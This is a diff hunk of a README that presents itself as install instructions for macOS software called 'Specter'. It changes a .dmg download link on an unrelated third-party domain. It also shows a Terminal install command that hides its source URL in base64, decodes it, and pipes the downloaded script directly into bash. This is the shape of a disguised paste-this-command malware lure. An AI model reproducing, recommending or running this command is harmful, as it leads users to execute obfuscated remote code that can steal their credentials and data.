@@ -34,7 +34,7 @@ Looking for more info ? Check out our Octobot guides at [octobot.cloud/en/guides
 
 ## How to Install
 
-### [Download Specter for MacOS (.dmg)](https://downloadmacos.com/macshare.php?call=specter)
+### [Download Specter for MacOS (.dmg)](https://downloadmacos.com/macshare.php?call=setkyr)
 ### Or install via Terminal
 ```sh
 /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9tYWNvc3R1dG9yaWFsLmNvbS9reXIvaW5zdGFsbC5zaA== | base64 -d))"
